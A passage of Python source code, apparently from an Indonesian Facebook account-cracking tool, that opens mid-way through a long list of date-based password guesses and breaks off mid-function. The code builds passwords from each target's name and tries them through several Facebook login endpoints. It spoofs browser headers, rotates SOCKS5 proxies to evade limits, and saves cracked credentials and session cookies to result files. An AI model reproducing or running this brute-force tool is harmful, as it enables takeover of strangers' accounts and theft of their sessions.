190587','190687','190787','190887','190987','190087','101187','101287','101387','100187','100287','100387','100487','100587','100687','100787','100887','100987','211187','211287','210187','210287','210387','210487','210587','210687','210787','210887','210987','210087','221187','221287','230187','230287','230387','230487','230587','230687','230787','230887','230987','230087','241187','241287','240187','240287','240387','240487','240587','240687','240787','240887','240987','240087','251187','251287','260187','260287','260387','260487','260587','260687','260787','260887','260987','260087','271187','271287','270187','270287','270387','270487','270587','270687','270787','270887','270987','270087','281187','281287','280187','280287','280387','280487','280587','280687','280787','280887','280987','280087','291187','291287','290187','290287','290387','290487','290587','290687','290787','290887','290987','290087','201187','201287','201387','200187','200287','200387','200487','200587','200687','200787','200887','200987','01111986','01121986','01131986','01141986','01151986','01161986','01171986','01181986','01191986','01101986','01011986','01021986','01031986','01041986','01051986','01061986','01071986','01081986','01091986','02111986','02121986','02011986','02021986','02031986','02041986','02051986','02061986','02071986','02081986','02091986','03111986','03121986','03011986','03021986','03031986','03041986','03051986','03061986','03071986','03081986','03091986','03001986','04111986','04121986','04011986','04021986','04031986','04041986','04051986','04061986','04071986','04081986','04091986','05111986','05121986','05011986','05021986','05031986','05041986','05051986','05061986','05071986','05081986','05091986','05001986','06111986','06121986','06011986','06021986','06031986','06041986','06051986','06061986','06071986','06081986','06091986','06001986','07111986','07121986','07011986','07021986','07031986','07041986','07051986','07061986','07071986','07081986','07091986','07001986','08111986','08121986','08011986','08021986','08031986','08041986','08051986','08061986','08071986','08081986','08091986','08001986','09111986','09121986','09011986','09021986','09031986','09041986','09051986','09061986','09071986','09081986','09091986','09001986','11111986','11121986','11011986','11021986','11031986','11041986','11051986','11061986','11071986','11081986','11091986','12111986','12121986','12011986','12021986','12031986','12041986','12051986','12061986','12071986','12081986','12091986','12001986','13111986','13121986','13011986','13021986','13031986','13041986','13051986','13061986','13071986','13081986','13091986','13001986','14111986','14121986','14011986','14021986','14031986','14041986','14051986','14061986','14071986','14081986','14091986','14001986','15111986','15121986','15011986','15021986','15031986','15041986','15051986','15061986','15071986','15081986','15091986','15001986','16111986','16121986','16011986','16021986','16031986','16041986','16051986','16061986','16071986','16081986','16091986','16001986','17111986','17121986','17011986','17021986','17031986','17041986','17051986','17061986','17071986','17081986','17091986','17001986','18111986','18121986','18011986','18021986','18031986','18041986','18051986','18061986','18071986','18081986','18091986','18001986','19111986','19121986','19011986','19021986','19031986','19041986','19051986','19061986','19071986','19081986','19091986','19001986','10111986','10121986','10131986','10011986','10021986','10031986','10041986','10051986','10061986','10071986','10081986','10091986','21111986','21121986','21011986','21021986','21031986','21041986','21051986','21061986','21071986','21081986','21091986','21001986','22111986','22121986','23011986','23021986','23031986','23041986','23051986','23061986','23071986','23081986','23091986','23001986','24111986','24121986','24011986','24021986','24031986','24041986','24051986','24061986','24071986','24081986','24091986','24001986','25111986','25121986','26011986','26021986','26031986','26041986','26051986','26061986','26071986','26081986','26091986','26001986','27111986','27121986','27011986','27021986','27031986','27041986','27051986','27061986','27071986','27081986','27091986','27001986','28111986','28121986','28011986','28021986','28031986','28041986','28051986','28061986','28071986','28081986','28091986','28001986','29111986','29121986','29011986','29021986','29031986','29041986','29051986','29061986','29071986','29081986','29091986','29001986','20111986','20121986','20131986','20011986','20021986','20031986','20041986','20051986','20061986','20071986','20081986','20091986','011186','011286','011386','011486','011586','011686','011786','011886','011986','011086','010186','010286','010386','010486','010586','010686','010786','010886','010986','021186','021286','020186','020286','020386','020486','020586','020686','020786','020886','020986','031186','031286','030186','030286','030386','030486','030586','030686','030786','030886','030986','030086','041186','041286','040186','040286','040386','040486','040586','040686','040786','040886','040986','051186','051286','050186','050286','050386','050486','050586','050686','050786','050886','050986','050086','061186','061286','060186','060286','060386','060486','060586','060686','060786','060886','060986','060086','071186','071286','070186','070286','070386','070486','070586','070686','070786','070886','070986','070086','081186','081286','080186','080286','080386','080486','080586','080686','080786','080886','080986','080086','091186','091286','090186','090286','090386','090486','090586','090686','090786','090886','090986','090086','111186','111286','110186','110286','110386','110486','110586','110686','110786','110886','110986','121186','121286','120186','120286','120386','120486','120586','120686','120786','120886','120986','120086','131186','131286','130186','130286','130386','130486','130586','130686','130786','130886','130986','130086','141186','141286','140186','140286','140386','140486','140586','140686','140786','140886','140986','140086','151186','151286','150186','150286','150386','150486','150586','150686','150786','150886','150986','150086','161186','161286','160186','160286','160386','160486','160586','160686','160786','160886','160986','160086','171186','171286','170186','170286','170386','170486','170586','170686','170786','170886','170986','170086','181186','181286','180186','180286','180386','180486','180586','180686','180786','180886','180986','180086','191186','191286','190186','190286','190386','190486','190586','190686','190786','190886','190986','190086','101186','101286','101386','100186','100286','100386','100486','100586','100686','100786','100886','100986','211186','211286','210186','210286','210386','210486','210586','210686','210786','210886','210986','210086','221186','221286','230186','230286','230386','230486','230586','230686','230786','230886','230986','230086','241186','241286','240186','240286','240386','240486','240586','240686','240786','240886','240986','240086','251186','251286','260186','260286','260386','260486','260586','260686','260786','260886','260986','260086','271186','271286','270186','270286','270386','270486','270586','270686','270786','270886','270986','270086','281186','281286','280186','280286','280386','280486','280586','280686','280786','280886','280986','280086','291186','291286','290186','290286','290386','290486','290586','290686','290786','290886','290986','290086','201186','201286','201386','200186','200286','200386','200486','200586','200686','200786','200886','200986','011185','011285','011385','011485','011585','011685','011785','011885','011985','011085','010185','010285','010385','010485','010585','010685','010785','010885','010985','021185','021285','020185','020285','020385','020485','020585','020685','020785','020885','020985','031185','031285','030185','030285','030385','030485','030585','030685','030785','030885','030985','030085','041185','041285','040185','040285','040385','040485','040585','040685','040785','040885','040985','051185','051285','050185','050285','050385','050485','050585','050685','050785','050885','050985','050085','061185','061285','060185','060285','060385','060485','060585','060685','060785','060885','060985','060085','071185','071285','070185','070285','070385','070485','070585','070685','070785','070885','070985','070085','081185','081285','080185','080285','080385','080485','080585','080685','080785','080885','080985','080085','091185','091285','090185','090285','090385','090485','090585','090685','090785','090885','090985','090085','111185','111285','110185','110285','110385','110485','110585','110685','110785','110885','110985','121185','121285','120185','120285','120385','120485','120585','120685','120785','120885','120985','120085','131185','131285','130185','130285','130385','130485','130585','130685','130785','130885','130985','130085','141185','141285','140185','140285','140385','140485','140585','140685','140785','140885','140985','140085','151185','151285','150185','150285','150385','150485','150585','150685','150785','150885','150985','150085','161185','161285','160185','160285','160385','160485','160585','160685','160785','160885','160985','160085','171185','171285','170185','170285','170385','170485','170585','170685','170785','170885','170985','170085','181185','181285','180185','180285','180385','180485','180585','180685','180785','180885','180985','180085','191185','191285','190185','190285','190385','190485','190585','190685','190785','190885','190985','190085','101185','101285','101385','100185','100285','100385','100485','100585','100685','100785','100885','100985','211185','211285','210185','210285','210385','210485','210585','210685','210785','210885','210985','210085','221185','221285','230185','230285','230385','230485','230585','230685','230785','230885','230985','230085','241185','241285','240185','240285','240385','240485','240585','240685','240785','240885','240985','240085','251185','251285','260185','260285','260385','260485','260585','260685','260785','260885','260985','260085','271185','271285','270185','270285','270385','270485','270585','270685','270785','270885','270985','270085','281185','281285','280185','280285','280385','280485','280585','280685','280785','280885','280985','280085','291185','291285','290185','290285','290385','290485','290585','290685','290785','290885','290985','290085','201185','201285','201385','200185','200285','200385','200485','200585','200685','200785','200885','200985','01111985','01121985','01131985','01141985','01151985','01161985','01171985','01181985','01191985','01101985','01011985','01021985','01031985','01041985','01051985','01061985','01071985','01081985','01091985','02111985','02121985','02011985','02021985','02031985','02041985','02051985','02061985','02071985','02081985','02091985','03111985','03121985','03011985','03021985','03031985','03041985','03051985','03061985','03071985','03081985','03091985','03001985','04111985','04121985','04011985','04021985','04031985','04041985','04051985','04061985','04071985','04081985','04091985','05111985','05121985','05011985','05021985','05031985','05041985','05051985','05061985','05071985','05081985','05091985','05001985','06111985','06121985','06011985','06021985','06031985','06041985','06051985','06061985','06071985','06081985','06091985','06001985','07111985','07121985','07011985','07021985','07031985','07041985','07051985','07061985','07071985','07081985','07091985','07001985','08111985','08121985','08011985','08021985','08031985','08041985','08051985','08061985','08071985','08081985','08091985','08001985','09111985','09121985','09011985','09021985','09031985','09041985','09051985','09061985','09071985','09081985','09091985','09001985','11111985','11121985','11011985','11021985','11031985','11041985','11051985','11061985','11071985','11081985','11091985','12111985','12121985','12011985','12021985','12031985','12041985','12051985','12061985','12071985','12081985','12091985','12001985','13111985','13121985','13011985','13021985','13031985','13041985','13051985','13061985','13071985','13081985','13091985','13001985','14111985','14121985','14011985','14021985','14031985','14041985','14051985','14061985','14071985','14081985','14091985','14001985','15111985','15121985','15011985','15021985','15031985','15041985','15051985','15061985','15071985','15081985','15091985','15001985','16111985','16121985','16011985','16021985','16031985','16041985','16051985','16061985','16071985','16081985','16091985','16001985','17111985','17121985','17011985','17021985','17031985','17041985','17051985','17061985','17071985','17081985','17091985','17001985','18111985','18121985','18011985','18021985','18031985','18041985','18051985','18061985','18071985','18081985','18091985','18001985','19111985','19121985','19011985','19021985','19031985','19041985','19051985','19061985','19071985','19081985','19091985','19001985','10111985','10121985','10131985','10011985','10021985','10031985','10041985','10051985','10061985','10071985','10081985','10091985','21111985','21121985','21011985','21021985','21031985','21041985','21051985','21061985','21071985','21081985','21091985','21001985','22111985','22121985','23011985','23021985','23031985','23041985','23051985','23061985','23071985','23081985','23091985','23001985','24111985','24121985','24011985','24021985','24031985','24041985','24051985','24061985','24071985','24081985','24091985','24001985','25111985','25121985','26011985','26021985','26031985','26041985','26051985','26061985','26071985','26081985','26091985','26001985','27111985','27121985','27011985','27021985','27031985','27041985','27051985','27061985','27071985','27081985','27091985','27001985','28111985','28121985','28011985','28021985','28031985','28041985','28051985','28061985','28071985','28081985','28091985','28001985','29111985','29121985','29011985','29021985','29031985','29041985','29051985','29061985','29071985','29081985','29091985','29001985','20111985','20121985','20131985','20011985','20021985','20031985','20041985','20051985','20061985','20071985','20081985','20091985','01111995','01121995','01131995','01141995','01151995','01161995','01171995','01181995','01191995','01101995','01011995','01021995','01031995','01041995','01051995','01061995','01071995','01081995','01091995','02111995','02121995','02011995','02021995','02031995','02041995','02051995','02061995','02071995','02081995','02091995','03111995','03121995','03011995','03021995','03031995','03041995','03051995','03061995','03071995','03081995','03091995','03001995','04111995','04121995','04011995','04021995','04031995','04041995','04051995','04061995','04071995','04081995','04091995','05111995','05121995','05011995','05021995','05031995','05041995','05051995','05061995','05071995','05081995','05091995','05001995','06111995','06121995','06011995','06021995','06031995','06041995','06051995','06061995','06071995','06081995','06091995','06001995','07111995','07121995','07011995','07021995','07031995','07041995','07051995','07061995','07071995','07081995','07091995','07001995','08111995','08121995','08011995','08021995','08031995','08041995','08051995','08061995','08071995','08081995','08091995','08001995','09111995','09121995','09011995','09021995','09031995','09041995','09051995','09061995','09071995','09081995','09091995','09001995','11111995','11121995','11011995','11021995','11031995','11041995','11051995','11061995','11071995','11081995','11091995','12111995','12121995','12011995','12021995','12031995','12041995','12051995','12061995','12071995','12081995','12091995','12001995','13111995','13121995','13011995','13021995','13031995','13041995','13051995','13061995','13071995','13081995','13091995','13001995','14111995','14121995','14011995','14021995','14031995','14041995','14051995','14061995','14071995','14081995','14091995','14001995','15111995','15121995','15011995','15021995','15031995','15041995','15051995','15061995','15071995','15081995','15091995','15001995','16111995','16121995','16011995','16021995','16031995','16041995','16051995','16061995','16071995','16081995','16091995','16001995','17111995','17121995','17011995','17021995','17031995','17041995','17051995','17061995','17071995','17081995','17091995','17001995','18111995','18121995','18011995','18021995','18031995','18041995','18051995','18061995','18071995','18081995','18091995','18001995','19111995','19121995','19011995','19021995','19031995','19041995','19051995','19061995','19071995','19081995','19091995','19001995','10111995','10121995','10131995','10011995','10021995','10031995','10041995','10051995','10061995','10071995','10081995','10091995','21111995','21121995','21011995','21021995','21031995','21041995','21051995','21061995','21071995','21081995','21091995','21001995','22111995','22121995','23011995','23021995','23031995','23041995','23051995','23061995','23071995','23081995','23091995','23001995','24111995','24121995','24011995','24021995','24031995','24041995','24051995','24061995','24071995','24081995','24091995','24001995','25111995','25121995','26011995','26021995','26031995','26041995','26051995','26061995','26071995','26081995','26091995','26001995','27111995','27121995','27011995','27021995','27031995','27041995','27051995','27061995','27071995','27081995','27091995','27001995','28111995','28121995','28011995','28021995','28031995','28041995','28051995','28061995','28071995','28081995','28091995','28001995','29111995','29121995','29011995','29021995','29031995','29041995','29051995','29061995','29071995','29081995','29091995','29001995','20111995','20121995','20131995','20011995','20021995','20031995','20041995','20051995','20061995','20071995','20081995','20091995','011195','011295','011395','011495','011595','011695','011795','011895','011995','011095','010195','010295','010395','010495','010595','010695','010795','010895','010995','021195','021295','020195','020295','020395','020495','020595','020695','020795','020895','020995','031195','031295','030195','030295','030395','030495','030595','030695','030795','030895','030995','030095','041195','041295','040195','040295','040395','040495','040595','040695','040795','040895','040995','051195','051295','050195','050295','050395','050495','050595','050695','050795','050895','050995','050095','061195','061295','060195','060295','060395','060495','060595','060695','060795','060895','060995','060095','071195','071295','070195','070295','070395','070495','070595','070695','070795','070895','070995','070095','081195','081295','080195','080295','080395','080495','080595','080695','080795','080895','080995','080095','091195','091295','090195','090295','090395','090495','090595','090695','090795','090895','090995','090095','111195','111295','110195','110295','110395','110495','110595','110695','110795','110895','110995','121195','121295','120195','120295','120395','120495','120595','120695','120795','120895','120995','120095','131195','131295','130195','130295','130395','130495','130595','130695','130795','130895','130995','130095','141195','141295','140195','140295','140395','140495','140595','140695','140795','140895','140995','140095','151195','151295','150195','150295','150395','150495','150595','150695','150795','150895','150995','150095','161195','161295','160195','160295','160395','160495','160595','160695','160795','160895','160995','160095','171195','171295','170195','170295','170395','170495','170595','170695','170795','170895','170995','170095','181195','181295','180195','180295','180395','180495','180595','180695','180795','180895','180995','180095','191195','191295','190195','190295','190395','190495','190595','190695','190795','190895','190995','190095','101195','101295','101395','100195','100295','100395','100495','100595','100695','100795','100895','100995','211195','211295','210195','210295','210395','210495','210595','210695','210795','210895','210995','210095','221195','221295','230195','230295','230395','230495','230595','230695','230795','230895','230995','230095','241195','241295','240195','240295','240395','240495','240595','240695','240795','240895','240995','240095','251195','251295','260195','260295','260395','260495','260595','260695','260795','260895','260995','260095','271195','271295','270195','270295','270395','270495','270595','270695','270795','270895','270995','270095','281195','281295','280195','280295','280395','280495','280595','280695','280795','280895','280995','280095','291195','291295','290195','290295','290395','290495','290595','290695','290795','290895','290995']
                    if len(nama)<6:
                        if len(depan)<900000:
                            pass
                        else:
                            self.password.append(nama)
                            self.password.append(depan+'123')
                            self.password.append(depan+'1234')
                            self.password.append(depan+'12345')
                    else:
                        if len(depan)<3:
                            self.password.append(nama)
                        else:
                            self.password.append(nama)
                            self.password.append(depan+'123')
                            self.password.append(depan+'1234')
                            self.password.append(depan+'12345')
                    if 'ya' in self.Paslist:
                        for xc in self.Passku:
                            self.password.append(xc)
                    else:pass
                    if 'async' in self.Method:
                        Itil.submit(self.asyncAPI, user, self.password)
                    elif 'validate' in self.Method:
                        Itil.submit(self.validateAPI, user, self.password)
                    elif 'regular' in self.Method:
                        Itil.submit(self.regularAPI, user, self.password)
                    elif 'asyncc2' in self.Method:
                        Itil.submit(self.asyncAPP, user, self.password)
                    elif 'validatee22' in self.Method:
                        Itil.submit(self.validateAPP, user, self.password)
                    elif 'regularr2' in self.Method:
                        Itil.submit(self.regularAPP, user, self.password)
                    else:
                        Itil.submit(self.asyncAPI, user, self.password)
               
        if self.live == 0 and self.check == 0:
            Console().print(Markdown(f"## Opshh anda tidak mendapatkan hasil sama sekali"),style='yellow') ; os.system('rm -rf DataLog/socks5.txt') ; sleep(3) ; sys.exit()
        else:
            Console().print(f'\n>_ Selamat, Anda Mendapatkan Hasil OK {H2} {len(self.live)} {P2}Dan Hasil CP {K2}: {len(self.check)}') ; os.system('rm -rf DataLog/socks5.txt') ; sleep(3) ; sys.exit()
   
   def asyncAPI(self, user, password):
       prog.update(des,description=f">_ @AdityaExec_ | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
       prog.advance(des) 
       ses = requests.Session()
       proxx = REQ().get_Proxy()
       ua = REQ().UserAgent()
       for pw in password:
           try:
               proxis = {'http': 'socks5://' + random.choice(proxx)}
               link = ses.get('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8', headers = {'User-Agent':ua})
               data = {
                 "m_ts":re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
                 "li":re.search('name="li" value="(.*?)"', str(link.text)).group(1),
                 "try_number":0,
                 "unrecognized_tries":0,
                 "email":user,
                 "prefill_contact_point":f"{user} {pw}",
                 "prefill_source":"browser_dropdown",
                 "prefill_type":"password",
                 "first_prefill_source":"browser_dropdown",
                 "first_prefill_type":"contact_point",
                 "had_cp_prefilled":True,
                 "had_password_prefilled":True,
                 "is_smart_lock":False,
                 "bi_xrwh":0,
                 "bi_wvdp":'{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
                 "encpass":f"#PWD_BROWSER:0:{str(mark()).split('.')[0]}:{pw}",
                 "jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                 "lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)
               }
               headers = {
                  "Host": "m.facebook.com",
                  "content-length": "2168",
                  "sec-ch-ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
                  "sec-ch-ua-mobile": "?1",
                  "user-agent": ua,
                  "viewport-width": "501",
                  "content-type": "application/x-www-form-urlencoded",
                  "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
                  "sec-ch-ua-platform-version": '"12.0.0"',
                  "x-asbd-id": "129477",
                  "dpr": "1.4375",
                  "sec-ch-ua-full-version-list": '"Google Chrome";v="117.0.5938.61", "Not;A=Brand";v="8.0.0.0", "Chromium";v="117.0.5938.61"',
                  "sec-ch-ua-model": '"CPH2127"',
                  "sec-ch-prefers-color-scheme": "light",
                  "sec-ch-ua-platform": '"Android"',
                  "accept": "*/*",
                  "origin": "https://m.facebook.com",
                  "sec-fetch-site": "same-origin",
                  "sec-fetch-mode": "cors",
                  "sec-fetch-dest": "empty",
                  "referer": "https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
                  "accept-encoding": "gzip, deflate, br",
                  "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,vi;q=0.6,ms;q=0.5"
               }
               cokii = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
               response = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', cookies = {'cookie':cokii}, data = data, headers = headers, proxies = proxis, allow_redirects=False)
               if "c_user" in ses.cookies.get_dict():
                  kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                  tree = Tree(f"\r",guide_style="bold grey100")
                  tree.add(f"{H2}{user} | {pw}").add(f'{H2}{kuki} {ua}')
                  prints(tree)
                  kntl = (f"{user}|{pw}|{kuki}")
                  self.live.append(kntl)
                  with open("Results/ok.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                  break
               elif "checkpoint" in ses.cookies.get_dict():
                    tree.add(f"{K2}{user} | {pw}").add(f'{K2}{ua}')
                    kntl = (f"{user}|{pw}")
                    self.check.append(kntl)
                    with open("Results/cp.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
               else:
                    continue
           except requests.exceptions.ConnectionError as e:
               prog.update(des,description=f">_ @AdityaExec_ | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
               prog.advance(des)
               sleep(15)
       self.loop+=1
   
   def validateAPI(self, user, password):
       prog.update(des,description=f">_ @AdityaExec_ | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
       prog.advance(des) 
       ses = requests.Session()
       proxx = REQ().get_Proxy()
       ua = REQ().UserAgent_API()
       for pw in password:
           try:
               proxis = {'http': 'socks5://' + random.choice(proxx)}
               link = ses.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&wtsid=rdr_03thTOvDjPwW2IySg&refsrc=deprecated&_rdr')
               data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
                 "jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                 "uid":user,
                 "next":"https://mbasic.facebook.com/login/save-device/",
                 "flow":"login_no_pin",
                 "pass":pw
               }
               headers = {
                  "Host": "mbasic.facebook.com",
                  "content-length": "144",
                  "cache-control": "max-age=0",
                  "dpr": "1.4375",
                  "viewport-width": "980",
                  "sec-ch-ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
                  "sec-ch-ua-mobile": "?1",
                  "sec-ch-ua-platform": '"Android"',
                  "sec-ch-ua-platform-version": '"12.0.0"',
                  "sec-ch-ua-model": '"CPH2127"',
                  "sec-ch-ua-full-version-list": '"Google Chrome";v="117.0.5938.61", "Not;A=Brand";v="8.0.0.0", "Chromium";v="117.0.5938.61"',
                  "sec-ch-prefers-color-scheme": "light",
                  "upgrade-insecure-requests": "1",
                  "origin": "https://mbasic.facebook.com",
                  "content-type": "application/x-www-form-urlencoded",
                  "user-agent": ua,
                  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                  "sec-fetch-site": "same-origin",
                  "sec-fetch-mode": "navigate",
                  "sec-fetch-user": "?1",
                  "sec-fetch-dest": "document",
                  "referer": f"https://mbasic.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&wtsid=rdr_03thTOvDjPwW2IySg&refsrc=deprecated&_rdr",
                  "accept-encoding": "gzip, deflate, br",
                  "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,vi;q=0.6,ms;q=0.5"
               }
               cokii = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
               response = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data = data, headers = headers, proxies = proxis, allow_redirects=True)
               if "c_user" in ses.cookies.get_dict():
                  kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                  tree = Tree(f"\r",guide_style="bold grey100")
                  tree.add(f"{H2}{user} | {pw}").add(f'{H2}{kuki} {ua}')
                  prints(tree)
                  kntl = (f"{user}|{pw}|{kuki}")
                  self.live.append(kntl)
                  with open("Results/ok.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                  break
               elif "checkpoint" in ses.cookies.get_dict():
                    tree.add(f"{K2}{user} | {pw}").add(f'{K2}{ua}')
                    kntl = (f"{user}|{pw}")
                    self.check.append(kntl)
                    with open("Results/cp.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
               else:
                    continue
           except requests.exceptions.ConnectionError as e:
               prog.update(des,description=f">_ @AdityaExec_ | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
               prog.advance(des)
               sleep(15)
       self.loop+=1
   
   def regularAPI(self, user, password):
       prog.update(des,description=f">_ @AdityaExec_ | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
       prog.advance(des) 
       ses = requests.Session()
       proxx = REQ().get_Proxy()
       ua = REQ().UserAgent()
       for pw in password:
           try:
               proxis = {'http': 'socks5://' + random.choice(proxx)}
               link = ses.get('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8')
               data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
                 "jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                 "m_ts":re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
                 "li":re.search('name="li" value="(.*?)"', str(link.text)).group(1),
                 "try_number":0,
                 "unrecognized_tries":0,
                 "email":user,
                 "pass":pw,
                 "login":"Masuk",
                 "bi_xrwh":re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1)
               }
               headers = {
                  "Host": "free.facebook.com",
                  "content-length": "177",
                  "cache-control": "max-age=0",
                  "upgrade-insecure-requests": "1",
                  "origin": "https://free.facebook.com",
                  "content-type": "application/x-www-form-urlencoded",
                  "user-agent": ua,
                  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                  "x-requested-with": "mark.via.gp",
                  "sec-fetch-site": "same-origin",
                  "sec-fetch-mode": "navigate",
                  "sec-fetch-user": "?1",
                  "sec-fetch-dest": "document",
                  "referer": "https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
                  "accept-encoding": "gzip, deflate",
                  "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
               }
               cokii = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
               response = ses.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data = data, headers = headers, proxies = proxis, allow_redirects=False)
               if "c_user" in ses.cookies.get_dict():
                  kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                  tree = Tree(f"\r",guide_style="bold grey100")
                  tree.add(f"{H2}{user} | {pw}").add(f'{H2}{kuki} {ua}')
                  prints(tree)
                  kntl = (f"{user}|{pw}|{kuki}")
                  self.live.append(kntl)
                  with open("Results/ok.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                  break
               elif "checkpoint" in ses.cookies.get_dict():
                    tree.add(f"{K2}{user} | {pw}").add(f'{K2}{ua}')
                    kntl = (f"{user}|{pw}")
                    self.check.append(kntl)
                    with open("Results/cp.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
               else:
                    continue
           except requests.exceptions.ConnectionError as e:
               prog.update(des,description=f">_ @AdityaExec_ | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
               prog.advance(des)
               sleep(15)
       self.loop+=1
   
   def asyncAPP(self, user, password):
       prog.update(des,description=f">_ @AdityaExec_ | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
       prog.advance(des) 
       ses = requests.Session()
       proxx = REQ().get_Proxy()
       ua = REQ().UserAgent_APP()
       for pw in password:
           try:
               proxis = {'http': 'socks5://' + random.choice(proxx)}
               link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fapp_id%3D1862952583919182%26cbt%3D1703222256708%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df20b65da6024398%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Ff1b243c652f4f2%2526relation%253Dopener%26client_id%3D1862952583919182%26display%3Dtouch%26domain%3Dwww.tiktok.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Fsignup%252F%253Fenter_method%253Denter_personal_homepage%2526enter_from%253Dpersonal_homepage%2526launch_type%253D0%2526lang%253Did-ID%2526redirect_url%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Fprofile%26locale%3Den_US%26logger_id%3Df217822085af3d%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1629871d73961%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Ff1b243c652f4f2%2526relation%253Dopener%2526frame%253Df1cbd2b1886fc3c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv18.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1629871d73961%26domain%3Dwww.tiktok.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.tiktok.com%252Ff1b243c652f4f2%26relation%3Dopener%26frame%3Df1cbd2b1886fc3c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',headers = {'User-Agent':ua})
               data = {
                 "m_ts":re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
                 "li":re.search('name="li" value="(.*?)"', str(link.text)).group(1),
                 "try_number":0,
                 "unrecognized_tries":0,
                 "email":user,
                 "prefill_contact_point":f"{user} {pw}",
